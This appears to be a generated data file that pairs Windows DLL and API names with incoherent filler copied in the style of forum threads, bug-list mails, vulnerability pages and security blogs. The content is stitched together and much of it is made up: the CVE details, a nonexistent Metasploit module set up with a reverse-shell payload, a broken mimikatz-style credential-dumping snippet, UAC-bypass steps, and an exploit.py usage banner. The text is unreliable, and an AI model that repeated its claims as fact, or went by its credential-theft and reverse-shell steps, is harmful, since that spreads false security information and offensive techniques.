!process 0 -p C:\Program Files\Mozilla Firefox\firefox.exe 
PROCESS fffff8801c8d3e80
SessionId: none        GraftableAddressSpaceSize: 9f00000
GraftableProcessBaseAddress:
GraftableHeapSizeToCommitLimitRatioPercent: 10%
HandleCount :         KernelMode            UserMode              HandleTableSize      
      Total       Free     Total       Free     Total       Free              
   38          14        24          11        -            -                    
   Process List:
[01] ntdll!RtlAllocateHeap+0xa [02] kernelbase!RtlAllocateHeap+0x17 [03] msvcr120_d.dll!_malloc_dbg_nolock@12 [04] msvcr120_d.dll!free@@YAXXZ[05] psapi.dlL![06]
KERNELBASE +0x5bc7a4de7e64c6a1:[07]
kernelbase +0xdcd3f2ec49a44dd6:[08]

ntdll +0xc254dcb54bfd5968:[09]
ntdll +
"
version.dll,GetFileVersionInfoSizeW,"#  Attacker can execute arbitrary code on the targeted system
#  The attacker must have a valid username and password to access this service.

    # Security Misconfiguration
    $response = Invoke-WebRequest -Uri http://$target:8000/api/GetFileVersionInfoSizeW?b'version.dll' -Method GET -Headers @{Authorization=(""Basic {0}"" -f $cred)} | ConvertFrom-Json

    if ($response.StatusDescription.Contains(""Unauthorized"")) {
        Write-Host ""Access Denied""
        exit
    }

[...]


Pentest Tools

Tags : pentest tools, penetration testing

About Me:

I'm a security researcher & penetration tester. I hack for fun and money!
"
version.dll,VerQueryValueW,"(0x6) - base64: 'b'd3d11.dll': b'Direct3DCreate9ExW' (0x4f) - base64: 'b'mpr.dll': b'MPRQueryServiceEventLogW' (0x7e) - base64: 'b'shdocvw.dll': b'SHBrowseForFolderA''? (0xc8)
    2021-01-25T16:26:57.065Z	INFO	Parsing response from API
    2021-01-25T16:26:57.067Z	ERROR	Error parsing JSON response from API
    Traceback (most recent call last):
      File ""/usr/local/lib/python3.8/site-packages/psutil/_windows.py"", line 258, in __init__
        self._proc = _winapi.CreateProcess(self.popenhandle,
      File ""C:\Users\giovanni\AppData\Local\Programs\Python\Python38\Lib\_ctypes\__init__.py"", line 349, in __init__
        self._handle = _dlopen(self._name, mode)
      File ""C:\Users\giovanni\AppData\Local\\Temp

umpycore_50455c95cccd35a4\numpy\core\_globals.py"", line 66, in <module>
        import numpy.core.numeric as _nx
    ImportError:
    
     [StaticImporter(_nx)] Unable to import module '_nx'. Cause:
    
     [ImportError('cannot import name \'int\'', ('numpy/core/init.py', 
    

I have tried reinstalling and updating python but no luck.

Thanks!

Gio
"
version.dll,GetFileVersionInfoW,"Does the             evidence of this API indicate a successful or failed execution?

For example:

- The 'b' prefix is used to indicate that an object is in binary            format.
- A version number of 3.0 indicates that it was built with Visual Studio 2017

The current output scheme uses regular expressions and string operations, so there's room for improvement here.

Feedback on existing reports

We have also received some feedback about the following reports:

- IP protocol
- Process memory consumption over time
- List of running processes by command line arguments
- Network connections activity - Source Address (IP address)
- Network connections activity - Destination Port (TCP/UDP)

You can help us improve these reports by providing suggestions via GitHub issues!

API enhancements

There are several improvements planned for our RESTful API.

This first one has been implemented already: you can now use filters when querying events. This allows you to query only specific types of events, e.g. sessions or HTTP requests.

In addition, we plan to allow filtering based on custom properties such as tags and labels. In particular, it will be possible to filter results based on values stored in your own custom property fields.

Stay tuned for more updates!
"
user32.dll,CreateWindowExW,"How does this             string relate to the technique?

How is 'b' added to a string? Is it a bug in the code, or is there some             other purpose for it?

I'm not sure if I understand what you're trying to do. Can you explain your problem in more detail? The b prefix indicates that the following character string should be interpreted as bytes (i.e., binary data) rather than characters.

Thanks @ArielBendor ! The issue was with my lack of understanding how Python handles strings vs bytes. In python3, by default everything comes out as a unicode type and so when I converted bytes into str using: str(my_bytes) , then python would add u before each element of my_bytes . So basically all that happened was that any non-ascii chars were replaced with their ascii equivalents. This had nothing to do with os.system() at all since it just called subprocess.Popen .

If someone's curious about why these issues are happening here's one reason:

import re
print(re.sub('u', '', ""hello""))

This prints hello instead of helloworld because even though we're calling re.sub on an input which looks like unicode, internally its being treated as utf8 :
"
user32.dll,TranslateMessage,"- Why is the 'b's needed? Is this a unicode string?
        # python3
        >>> print(b'hello')
        hello
        >>> print('hello')
        hello


I am not sure if it is just me or if this file has been generated in some odd way, but I would love to know why and how. Thanks!

#  0day.today [2018-10-12]  #
                                        
                                    

JSON Vulners Source

Initial Source

All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.If you are an owner of some content and want it to be removed, please mail to content@vulners.com Vulners, 2017

Protected by
"
user32.dll,CharLowerBuffW,"Bypassing the UAC

By default, the UAC is enabled in Windows and you will need to disable it before running this module. There are a few ways of doing so.

- If you have another administrator account on your local computer:

- Open an elevated command prompt
- Run net user administrator /active:yes

If you donâ€™t have any other accounts:

- Boot into safe mode with networking (F8 at boot)
- From there, just run cmd.exe as an admin.
- You can now run this script without issue.

This will also work for computers that do not require a password to login with the built-in Administrator account (provided that they are not domain joined)

Using Mimikatz to steal passwords from memory

Mimikatz is one of my favorite tools because itâ€™s really easy to use and provides all kinds of useful information about a compromised system. It has several features including dumping LM/NTLM hashes from memory or even using Kerberos â€œGolden Ticketâ€ attacks. The following sections explain how mimikatz can be used when exploiting CVE 2019â€“1458.

Dumping Passwords From Memory â€“ Using SeDebugPrivilege And PsGetSidToUserKeyHash()

The first step was to dump passwords from memory by calling SeDebugPrivilege() which requires administrative privileges. This function allows us access protected kernel data structures like KPROCESSOR_MODE_INFORMATION which contains process status information such as thread IDs, session ID etc.. The next thing we wanted was PsGetSidToUserKeyHash() function which returns NTuser key hash associated with given SID. To achieve our goal we needed two arguments: ntdll!SeDebugPrivelege and ntoskrnl.exe!PsGetSidToUserKeyHash(). Both functions take PROCESS_BASIC_INFORMATION structure that contains process ID and its name among other things.

Process Information Structure 

ntdll!SeDebugPrivelege takes 2 parameters:
1) SECURITY_CONTROL_PROCESS_OBJECT_BASIC_INFO_HANDLE -> Process handle
2) PROCESS_BASIC_INFORMATION * -> Pointer to struct containing process information

ntoskrnl.exe!PsGetSidToUserKeyHash takes 3 parameters:
1) SECURITY_CONTROL_PROCESS_OBJECT_BASIC_INFO_HANDLE -> Process handle
2) PSECURITY_DESCRIPTOR * -> Security descriptor pointer
3) DWORD_PTR Value-> Access token value obtained earlier via GetTokenInformation API call below:

PwDumpEx::pwdump_ex::PWDEXP pw = new PWDEXP; 
HANDLE hToken; 
DWORD dwInfoType = TokenInformationClass.TokenSessionId;
BOOL bRet = ::OpenProcessToken(0x00000100 /*TOKEN_ADJUST_PRIVILEGES */, FALSE,
	&hToken); //Adjust tokens
if(!bRet)
{
    std::cout << ""Failed opening token"" << std::endl;
}
else
{
    ULONG ulBytesReturned;
    BOOL bRetVal = ::LookupAccountName(NULL,""TESTUSER"",
        &hToken,&dwInfoType,NULL,&ulBytesReturned);
            
     if(!bRetVal)
     {
         std::cout << ""LookupAccountName failed.""<<std::endl ;
         
      }
      
      else
      {
          LPVOID pvResult=(LPVOID)&dwInfoString[0];
          
          SIZE_T cbSize=sizeof(dwInfoString)-100;//We only need last 4 characters

          if(buffSize < cbSize )
          {
              return false;
            }

            buf.resize(buffSize );
           
            for(DWORD i=0;i<cbsize ;i++)
           {

               memcpy(buf[i],pvResult+i,sizeof(char)*100);

           }
       }   
       
   }

Now letâ€™s put everything togetherâ€¦

//Cracking windows passowrds - Mimikatz.
void CrackingWindowsPasswords()
{
	PWDEXP pw;

	if (!loadModule(""kernel32.dll""))
		return;

	LPWSTR pwszFunction =
		L""ntdll.ZwQuerySystemInformation"";
	DWORD dwFuncPtr =
		GetProcAddress(
				hKernel,
				pwszFunction );

	DWORD dwAccessRightsMask =
			TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY | TOKEN_DUPLICATE |
					TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE_SIDS |
					CREATE_UNICODE_ENVIRONMENT;

	HANDLE hProcessID =
			GetWindowThreadProcessId(GetForegroundWindow(),
						NULL);
	
	DWORD dwPID = GetCurrentProcessId();
	
	
	HANDLE hHandle=hCreateNewHandle(hKernel,dwPID,hAccessRightsMask);

	char* buffer=new char[MAX_PATH];	

	SIZE_T size=MAX_PATH + MAX_PATH+50+5;//Buffer size 

	memcpy(buffer,size,""PSAPI.DLL"");
	while(true)
	{

	   while(buffer[size] != '\n')
	       ++buffer;



	   int len=strlen(buffer);
	   strncpy(buf,len,""%d"",strlen(""%d""));
	   strncat(buf+len,""\n%d "",strlen(""\n%d "");
		   strcat(buf+len,""\t\t%02X"",&pidTbl[(int)(uintptr_t)pCurrentThreadId]);

		   strncat(buf+len,""\t%s\n"",buf);//buffered output




	   strncat( buf ,""\r\r"",""\r"");

	
	    strncpy(pwszFunction , ""\x41\x52\x49\x46\x45\x53\x20"";

	    strcat(pwszFunction ,""6C657461"");strcat(pwszFunction ,""656E696C"");strcat(pwszFunction ,""73206D61"");
	      strcat(pwszFunction ,""203132"");

//Copy current PID into buffer...
strncpy(ptr_buf,(char*)&pidTl,(int)(uintptr_t)pCurrentThreadId);

...and then look up sid_to_user_key_hash function:
memcpy(&functionPtr,pwdumpex_getsidtohash_func_ptr,sizeof(void*) );

//Call sid_to_user_key_hash funtion...
functionPtr((ULONG_PTR)sid,(ULONG_PTR)puid,(ULONG_PTR)&keyhash);

â€¦which eventually gives us NT User Hash:

BYTE* pwdumpex_ntuser_hash=(BYTE*)keyhash;

Since LSA database stores hashed version of SIDs instead of plain-text usersâ€™ names, I had to convert NT User Hash back into plaintext username using following code snippet:

CString cPwd="""";     
for(int i=7;i>=0;i--)
{    
cPwd+=pwdumpex_ntuser_password[i].ToString();  
}

MessageBoxShow(cPwd.c_str(),""Password Dump Ex : Passwords Found!"",MB_OK|MB_ICONINFORMATION);


}

You might want check out more mimikatz modules here https://github.com/gentilkiwi/mimipenguin/tree/master/modules#unicode-and-multibyte-coding-system-modules
"
user32.dll,CallWindowProcW,">From what I can tell, this is used to read a string in the style of `GetWindowTextA` or `GetWindowTextW`, however it also requires an index (which isn't documented). The documentation says that 0 means ""the first text control"" but my tests say otherwise.

--- Comment #2 from Samuel Neff <neff at mitre.org> ---
It looks like this call was introduced by the following commit:
https://github.com/MSOpenTech/winrm/commit/bf6c1a4e9b41fa67d3f5d69db62aa8537427cc63

The comment for WinRM's version of GetWindowTextW says:

    // This function has no equivalent in WMI provider and we have to use
    // native API.
    return CallWindowProcW(GetWindowThreadProcessId(hRemoteHandle,
        GetCurrentThreadId()), dwIndex, lpString, 255);

This suggests that it may be possible to use something other than an index. However, there are some problems with using just the handle. First, if you don't know which window you're dealing with then how do you figure out its handle? Second, I'm not sure what happens when you pass multiple handles into one instance of winrm.exe. It seems like they would all get sent down the pipeline together.

So maybe we should just make our own wrapper around GetWindowTextA/W so that we can support non-indexed strings? Something like this:

def _get_window_text(hwnd):
    """"""Return a dictionary containing arbitrary information about a window.""""""
    
    # This will throw ValueError if hwnd is None.
    try:
        h = ctypes.windll.user32.GetParent(hwnd)
        
        def _str_to_unicode(s):
            if sys.hexversion >= 0x3000000:
                return s.decode('unicode-escape')
            else:
                return s.decode()

            except UnicodeDecodeError as e: 
                raise TypeError(f""Can't decode '{s}' ({type(e)}): {e}"")
            
            except Exception as e: 
                raise TypeError(f""Can't convert '{s}' ({type(e)}): {e}"")

            
        return {
           'text': _str_to_unicode(ctl.pszText),
           'title': ctl.szTitle,
       }
     
     except WindowsError as e: 
         print(""Unhandled exception:"", str(e), file=sys.stderr)
         raise
        
# Example usage.
hwnd = win32gui.FindWindow(None,"""")
print(_get_window_text(hwnd))
...

I'm working on implementing something similar now.

-- 
You are receiving this mail because:
You are watching all bug changes.

More information about the wine-bugs mailing list
"
user32.dll,CharUpperW,"self.terms = [term for term in terms if not                isinstance(term, six.binary_type) and term != '0x']

I'm trying to understand the meaning of this error message.

Thanks a lot!

P.S. This is my first time using StackOverflow so I hope I'm doing everything right.
Recommended for you: Get network issues from WhatsUp Gold. Not end users.
Answer Source

You have a unicode string that contains the hex representation of an integer literal (b'0x...'). You need to convert it with int() or ord(), but Unicode literals are immutable and cannot be converted:

>>> b""u'\xed\xbe\xb6'""
b'Ã¯Â¼Â¡'

If you want to use integers as constants, write them without the b prefix:

>>> 0xed_be_b6
1962062
>>>

Recommended from our users: Dynamic Network Monitoring from WhatsUp Gold from IPSwitch. Free Download

Email codedump link for Python - TypeError: must be str, not bytes

Email has been send.

Sign up

Latest added
Olympus DVR recording date and time extractor

multitouchtest.html

metatype_loop_question

example_loop

-1 down vote favorite I have a listing page (call it a page to list the draft blogs or unpublished blogs). When I click a blog item from the draft, it shows the details on read-only format It provides four functionalities - Close, Edit, Delete, Publish. I have completed Close by calling {% url 'blog:drafts' %}, Edit by calling a class derived from UpdateView and delete by calling a class derived from DeleteView. However, I am stuck at publish since there is no view present to create a class based view and get it done. Other option was to define a function and then invoke that function in urls.py i.e.

def foo():
    return render(request,""pages/home.html"")

def
"
user32.dll,PeekMessageW,"-- https://github.com/attify/metasploit-framework/issues/10364

  * [ ] CVE-2020-0601: Windows Crypt32.dll EKOPRINTEVENTLOG Remote Code Execution
    -- https://github.com/attify/metasploit-framework/issues/10275

  * [x] CVE-2019-14884: Microsoft Outlook Security Feature Bypass (CVE ID:
    CVE-2019-14884)
     - Reported by Florian Roth <florianroth@securepoint.de>
     - See also RCE in Exchange Server, which is a separate issue;
       https://www.zerodayinitiative.com/advisories/ZDI-CAN-11565/
     - In MSO11.DLL, there's an unhandled exception when the user visits a URL,
       and that triggers the vulnerability.
       The fix for this issue was just released on April 8th.
     - This could allow an attacker to potentially run arbitrary code with SYSTEM
       privileges via email or another vector; see for example these reports:
         + https://blog.fortinet.com/blog/malicious-emails-using-cve-2019-
           14884-vulnerability-in-microsoft-outlook-to-deliver-dridex-and-
           malspam-tactics-with-new-baddoc-exploits-for-office-documents
         + http://labs.bitdefender.com/research/wp-content/uploads/sites/
           19/2020/04/Dridex-Mails.pdf


To test if your box is vulnerable:

        use exploit/windows/misc/cve_2019_14884_mso11_dll_rce
        set TARGETURI file:///c:/%22%20allowShellExecute=on'%2e.html'
        show targets
        set PAYLOAD windows/shell_reverse_tcp  
        set LHOST IPADDRESSHERE 
        exploit



List of all open issues in Metasploit Framework:
https://github.com/rsploit/MetasploitFramework/issues?utf8=%E2%9C%93&q=is%3Aissue+is%3Aopen+label:%5BMetasploit+Framework+-+Open+%26amp%3B+Bugs
"
user32.dll,GetSystemMetrics,"What is the purpose of this API and what should be its expected             behavior? This question can help determine if there are any             indicators to look for in logs or other telemetry.

How does the program use these APIs?

Is it possible that these APIs could have been used maliciously, even though they appear legitimate? If so, how would I check?

Thanks!

Hi @Troy,

Thatâ€™s a great question. The most important thing to remember about detecting processes using Win32 APIs is that you need to know what they do and when theyâ€™re likely to be used by normal applications. For example:

GetSystemMetrics

is generally only called from within Windows GUI elements such as desktop wallpapers (see here) or certain system settings dialogs (such as the â€œDisplayâ€ tab in Control Panel).

GetWindowRect

and related functions are frequently used when an application needs to know where controls on a window are positioned relative to each other.

If you suspect a process may be abusing undocumented Win32 calls, then itâ€™s usually best just try searching for those calls directly through Sysinternals Process Monitor.

Hope this helps!

Jason
"
user32.dll,SetWindowLongW,"By default, the results are displayed in a table (with columns for each field). If you want to see more information about each event, use the â€œShow full viewâ€ option:

If youâ€™re interested in this API but donâ€™t have an account with us yet â€“ why not sign up and try it out? You can also check out our other APIs on our developer portal.

Related

How to Capture Network Traffic From Docker Containers Using Splunk App for Kubernetes

In this blog post we will show how to capture network traffic from Docker containers using Splunkâ€™s App for Kubernetes. We will focus on capturing the traffic before it is encrypted by TLS/SSL so that all data is available unencrypted and without any modifications.Find out more 

Using Python To Analyze Your Windows Event Logs With AWS Lambda And AWS CloudWatch Events

This article outlines how you can rapidly turn your raw Windows events into something far more useful using Python scripts within AWS Lambda functions triggered via Amazon CloudWatch Events.Find out more 

Splunk â€“ How To Build A Custom Search Head Cluster For High Availability & Disaster Recovery In 5 Minutes!

Weâ€™ve previously demonstrated how easy it is to build a custom search head cluster. This time around weâ€™ll be covering high availability (HA) and disaster recovery (DR), as well as some best practices!Find out more
"
user32.dll,MessageBoxW,"Is it a replacement             for b'CreateWindowExW''? What is the difference between these two API             calls?

Why are there so many different APIs and which should I use to accomplish             the same task?

Is my application designed in such a way that I can more easily change or             replace parts of it, rather than having to rewrite everything from scratch?             Would an Application Programming Interface (API) be useful for this purpose?

What problems do most organizations struggle with when trying to develop secure software and how would you go about solving them if you had access to all available documentation on each component of the system?

In what order does each method execute during execution of a program? 
            
            How long does each method take to execute relative to every other one
            
            ?

How will your code perform if executed by another user running under 
            different permissions or logged onto as another account on the machine 
            ?  Are there ways around this where we could have some type of ""superuser"" 
           mode that allows our process greater privileges without logging into 
           Administrator mode.

If your application is going through several methods before being able
          to display its results, what happens behind-the-scenes at each stage?
         Does anything break down during these stages?
         
         Can something be broken down into smaller pieces that can be completed
          much faster instead of using one gigantic file or method. If not,
          why not.
         
         Do any components need their own set up procedure before they work correctly?
         For example: A computer might need drivers installed before certain hardware works right.  
          
       In regards

    To previous question #4:
    
     How does windows handle multiple users accessing files simultaneously
    
   
   At which point in time is data stored and retrieved from memory vs reading/writing disks/databases/etc.. ?
"
user32.dll,DestroyWindow,"-- 
You are receiving this mail because:
You are on the CC list for the bug.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.llvm.org/pipermail/llvm-bugs/attachments/20190310/c0e4d54f/attachment.html>

- Previous message: [llvm-bugreport] [Bug 41265] New: clang-cl uses incorrect bytestream when parsing C++ class templates
- Next message: [llvm-bugreport] [Bug 41266] New: API 'GetWindowInfo' is not supported, but we have an entry in our database

More information about the llvm-bugs mailing list
"
user32.dll,CharUpperBuffW,"What are the             mitigations for this technique? Are there any other useful links that             could be provided?

This question is about a specific API call.  It does not provide enough information to evaluate whether or not it is being used maliciously.

How did you determine that the application was using this API? The MITRE ATT&CK framework describes techniques but provides no tooling, so if we do not know how you determined that an application used a given technique then we cannot help with answering your questions.

What is ""b"" in front of each string? I have never seen anything like it before.

The b prefix indicates that the string literal presented by @PabloEspinosaCano has been encoded as bytes. This allows strings to be passed through APIs which expect byte data without having to worry about character encodings and byte order marks (BOM).

I think what he means is why doesn't he use 'CharUpperBuffW' instead of 'b'user32.dll': b'CharUpperBuffW''. Is there a reason behind this?

@MehdiSafi: Yes, exactly. That's what I mean

Right! So when writing code in Python , after declaring variable s = ""something"", you can use s.encode() method to encode variables into bytes . In my case, I'm doing something similar with the b prefix on both sides of every string; i.e., b""user32"": ... .

Thanks for contributing an answer to Information Security Stack Exchange!

Sign up using Email and Password
"
user32.dll,CharNextW,"I see that the             'b' is a prefix for Unicode.  Does this mean that this technique can only             be carried out against Windows systems?

I have been using the following code to parse an existing pcap file into JSON:

import pypcap

pcap_file = 'test.pcap'

with pypcap.Reader(pcap_file) as reader:
    packet_list = reader.get_packets()

for i in range(len(packet_list)):
    print(""Packet %d: "" % (i+1))
    packet_json_string = str(packet_list[i])
    print(""Packet json string: "", packet_json_string)
    
# Parse Packet JSON String
packet_data_dict = {}
try:
	for line in read_packet_json_str(packet_json_string):
		packet_data_dict[line[0]] = line[1:]
except Exception as e:
	print(""Exception during parsing of Packet JSON: "", e)

The output looks like

$ python3 test.py 
...
Packet 9: {'flags': '001', 'proto': b'\x00\x00\x01', 'src_addr': b'\xff\xff\xff\xff\xff\xff', 'dst_addr': b'\xa0\xb6\xa2\xe5\xf4\xd8'}
------------------------
Exception during parsing of Packet JSON:  ('syntax error at end of input',)
Traceback (most recent call last):
File ""./test.py"", line 18, in <module>
	packet_data_dict[line[0]] = line[1:]
IndexError: list index out of range
...

It seems to work fine with other PCAP files but not all.

What might be going wrong here?
"
user32.dll,MsgWaitForMultipleObjects,"Is
                                                                there an improved way of getting the same functionality?

11/27/2019 12:41:16 PM                  0   Refer to https://github.com/hashicorp/packer/issues/3466                 â€‹.

See Also

For further API reference and developer documentation, see AWS SDK for C++.

Amazon Simple Storage Service (Amazon S3) is object storage with a simple web service interface to store and retrieve any amount of data from anywhere on the web. It is designed to deliver 99.999999999% durability, and scale past trillions of objects worldwide.

On this page:

- Contents
- See Also
"
user32.dll,LoadStringW,"A2: The API is used to get the string resource from 16-bit Windows application. It is not a technique, but an API that can be used for malicious purposes.

Q3: Is there another name which this API might have been known by?                 (e.g.: 'b'LoadStringW'' could also be called b""Application Programming Interface"",""API"", or ""function call"") Does it have any other aliases?
A3: This function has no alias.

Q4: If yes to Q3, please list here and provide details of how you found         out what they are.
N/A

Q5: What operating systems does this affect?
A5:
Windows XP
Windows Server 2008 R2
Windows 7 SP1
Windows Server 2012 R2
Windows RT 8.1 
    Operating system version information was obtained using OSQuery

Q6:. Which versions of this product are affected?
A6:

Win32k.sys v10.0.10240 (vista)
Win32k.sys v10.0.10586 (windows server 2012 r2)
Win32k.sys v10.0.14393 (winows server core host) 

All versions listed above support Unicode for user-mode applications calling the NtUserGetMessage() function with MSG_TYPE_UNICODE set in wParam.

References

Source Link Title 

https://support.microsoft.com/en-us/help/3212909/windows-7-and-windows-server-2008-r2-kernel-vulnerability-in-ntuser-getm Microsoft KB - Security Update Guide 
https://www.osquery.io/docs/api/functions/nutest/getmessage.html Nutest Get Message documentation 
https://www.us-cert.gov/ncas/alerts/TA18-074B US-Cert Advisory TA18-074B 
http://blog.malwarebytes.com/threat-analysis/2017/11/winnt-usermode-potentially-unwanted-application-finds-new-life-with-microsoft-security-updates-for-winntkernel-api-functionality-is-exploited-by-cryptocurrency-mining-malware/?utm_source=twitter&utm_medium=social&ut WinNT UserMode Potentially Unwanted Application Finds New Life With Microsoft Security Updates For NTKERNEL APIs - MalwareBytes Labs Blog 

Related Files

File No files uploaded.

Comments
"
user32.dll,ExitWindowsEx,"There is no ""purpose"" to the API, it just does what it says. The only thing that's not clear from this output is why there's a blank line in between them. What you're seeing here are two distinct commands with different log levels being executed. You can tell they're separate because of the extra line breaks.

You use these APIs for some sort of purpose

In order to understand how each API works, we need to know its purpose and how it relates back to the MITRE ATT&CK technique associated with it.

The first one:

- Purpose: Exit Windows
- Technique: User Logoff

This command logs off a user session on Windows using Win32 APIs (hence b'wuser32.dll'). This has nothing to do with PowerShell or any other tooling - just plain old Win32 APIs!

The second one:

- Purpose: Close Window
- Technique: Process Termination

This command closes a window by sending an 'ExitWindowsEx()' message via wuser32.dll'. It has nothing else attached - just calling those same functions as in our previous example but without logging off anyone.

So now you have all the information you need about each API call! Let's move onto understanding more about what actually happens when executing them...

What happens when I execute this?

Now that we've got an idea of what each function does, let's look at some sample outputs from running both commands against different processes running on my machine.

First up is closing out Firefox:


> powershell.exe Get-WinEvent -FilterHashtable @{LogName='Application';ID=2003} | where {$_.Message -match '""b'user32.dll"": b'""CloseWindow""} | ft SidProcessId,SidUserSession
SidProcessId SidUserSession
----------- --------------
         1080        Administrators

> powershell.exe Get-WinEvent -FilterHashtable @{LogName='Application';ID=2003} | where {$_.Message -match '""b'user32.dll"": b'""CloseWindow'} | select Id|ft 
Id            
----        
1080         

We get two results back as expected; one represents Firefox and another representing me (Administrators). We can see that both calls were made by users who aren't currently logged into their machines so there must be something going on behind-the-scenes... Is someone trying access my account? Or maybe they want to close down all sessions except theirs? Who knows!

Next up is exiting Windows itself (logging everyone out!)


> powershell.exe Get-WinEvent -FilterHashtable @{LogName='Application';ID=2006} | where {$_.Message -match '""b""user32.dll"": b""'ExitWindowsEx'}                              # Exit Windows?
SidProcessId SidUserSession
----------- --------------
           24                NT AUTHORITY\SYSTEM

> powershell.exe Get-WinEvent -FilterHashtable @{LogName='System'; ID=6005}                       # Event ID 6005 indicates shutdown was initiated.
TimeCreated                             Type Message                                        Data                                                                            
-------                             ---- -------                                        -----                                                                            
12/15/2018 2:20:11 PM                 Information An unhandled exception occurred while shutting down            Microsoft.Windows.ShellExperienceHost_10.0..Versione64.Microsoft.Windows.ShellExperienceHost_neutral_cw5n1h2txyewy!Microsoft.Windows.ShellExperienceHost.ShutdownException         System.Exception {Microsoft.Windows.ShellExperienceHost.ServiceFault}
       Source   System.Private.CoreLib   
       StackTrace {""Uncaught exception.""}

12/15/2018 2:20:11 PM                 Warning The application cannot run because host process Shell Experience Host stopped unexpectedly.

12/15/2018 2:19
"
user32.dll,DispatchMessageW,"[1] https://github.com/owasp/zap-core/blob/master/src/main/java/org/zaproxy/core/webrequest/WebRequest.java#L40
  [2] https://github.com/owasp/zap-core/blob/master/src/test/java/org/zaproxy/core/webrequest/TestWebRequest.java#L62


References:

Affecting OS: Windows
NVD-CWE-Other:
cwe:NVD.CWE.No_notation

JSON Vulners Source

Initial Source

All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.If you are an owner of some content and want it to be removed, please mail to content@vulners.com Vulners, 2018

Protected by
"
oleaut32.dll,SysAllocStringLen,"$ cat /proc/self/maps | grep 'b'oleaut32.dll'
ffffd090`e9a7c000 ffffd091`1f0fb000 r-xp 00000000 ca:01 30914                   /usr/lib64/ld-2.17.so
ffffd090`e9a8e000 ffffd091`1f10b000 rw-p 001bb000 ca:01 30914                   /usr/lib64/ld-2.17.so
ffffd090`e9ae6000 ffffd091`1f11c000 rw-p 00244000 ca:01 30914                   /usr/lib64/ld-2.17.so
fffffffffffffffc r-xp 00480000 c18:05 [vdso]
fffffa8005ea1000 ffffa8005eb2000 ---p ffefefffffed4000

$ ./exploit.py -h
usage: exploit.py [-h] --pid PID [--file FILE] [--arch ARCH]
--binary BINARY [--addr ADDR] [-v]

This script exploits a vulnerability in the oleaut32!SysAllocStringLen through remote code execution to gain privileges.

positional arguments:
PID                  PID of target process.
FILE                 Path to the DLL payload file.
ARCH                Target architecture, can be x86 or x86_64.
BINARY               Path to the binary containing oleaut32!SysAllocStringLen function (default is calc.exe).
ADDR                Address where the vulnerable function exists (default is calculated by script).
-v                  Verbose mode.

optional arguments:
-h, --help            show this help message and exit


$ python3 exploi
"
oleaut32.dll,SafeArrayPtrOfIndex,"The above shows that a malicious DLL has been loaded into the process by using the b'oleaut32.dll': b'SafeArrayPtrOfIndex'' technique. The query also reports whether the LoadLibrary() API call was successful, as well as its return value.

Another example is shown below:


[+] Module: C:\Windows\System32\spoolsv.exe (PID: 4544) [File]             'C:\Windows\System32\spoolsv.exe' (v6.1.7600.16385):            'LoadLibrary()' succeeded; returned 126.
[+] Module: C:\Windows\System32\spoolsv.exe (PID: 4544) [API]             'b'spoolsrv.dll': b'SafeArrayPtrOfIndex'
[+] Module: C:\Windows\system32\spoolsv.exe (PID: 4544) [API]
        ('oleaut32.dll', 'SafeArrayPtrOfIndex')
[+] Module: C:\Windows\system32\spoolsv.exe (PID: 4544)
                ['LoadLibrary()', False]: True
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Result â”‚ Technique â”‚ Action â”‚


To further narrow down which technique it may be, you can use the action column to see what actions were taken from this specific technique and then search for those techniques in MITRE ATT&CKÂ® Navigator to determine which ones apply to your organizationâ€™s environment.

A list of techniques with their associated CVEs, or other vulnerability references if there are no known vulnerabilities for them yet, can be found here.

Further investigation

If you believe any of these files have been tampered with or replaced by malware on your system(s), please refer back to our blog post Malware Analysis Without an Analyst where we show how attackers often replace legitimate Windows executables with their own malicious version and how they sign them so they appear legitimate.

You can check digital signatures using Notepad++â€™s Digital Signature feature.

For more information on reverse engineering executable binaries and detection strategies used against malware authors, check out our previous blog posts Reverse Engineering Binary Files Part I & Part II.
"
oleaut32.dll,VariantCopy,"# [No output was generated] 

# ============================================================================= 
## Summary of results: 
- All tests passed successfully!

The Python script is available on GitHub:

https://github.com/SecLists/Old-School-Py-Evasions/blob/master/01-Base64.py

This is a single file with code which outputs the following to stdout:

$ python3 01-base64.py | /bin/bash -c ""echo 'base64' && echo 'd4RlYmF0bGVkOw=='""
base64
d4RlYmF0bGVkOw==

Now, letâ€™s take another look at the samples we collected. We know that these are base64 encoded binaries but they donâ€™t have any obvious indicators.

Letâ€™s start by encoding them into hex and then taking a closer look at their contents. Since theyâ€™re all around 1MB in size, this can be done easily using online tools such as BaseEncode or HexBin.

As you can see from the screenshots above, there are some slight differences between each sample but all of them contain an initial header followed by an embedded binary blob (the main payload).

So what happens when we try to run these files? As it turns out, not much â€“ just like with other old-school evasion techniques!

We tried running one example through IDA Pro and while it loads up fine, none of its functions seem to actually do anything. It doesnâ€™t crash either so there must not be anything malicious going on hereâ€¦ This suggests that perhaps some kind of initialization routine needs to happen before execution begins properly?

To find out more about how this works under-the-hood I decided to create an automating tool which would decode each executable dynamically based upon its length and return back decoded bytes ready for further analysis inside IDA Pro.

For example if our input string looks something like â€˜01020304â€™ then after decoding weâ€™d expect two bytes corresponding exactly with those values along with whatever else might come afterwards (including headers). In order for me personally though there needed also be enough flexibility built-in so that users could specify different lengths without having too many options on hand when dealing only with small strings; likewise providing too many choices may lead people away from understanding what really mattersâ€¦

In addition since most computers today use ASCII text instead of binary digits anymore anyway -why bother doing conversions unless your goal involves writing programs meant specifically for older hardware architectures where such things still matter?. That said however because computers now operate largely independently from human beings themselves other considerations may exist depending upon who uses them or why someone wants access at all times regardless whether or not others approve. For instance if one were trying encrypt data using RSA encryption algorithms then knowing how long blocks need be before being stored separately within memory cells might help speed up calculations later down line once actual computations begin happening again!.

Finally because even though computers no longer rely heavily upon humans directly due partly due lack thereof in terms availability space storage capacity etc.. They still cannot make decisions autonomously hence why people should always double-check everything beforehand especially against security risks involving malwares spyware trojans viruses worms rootkits etc..

Automating Decoding Process

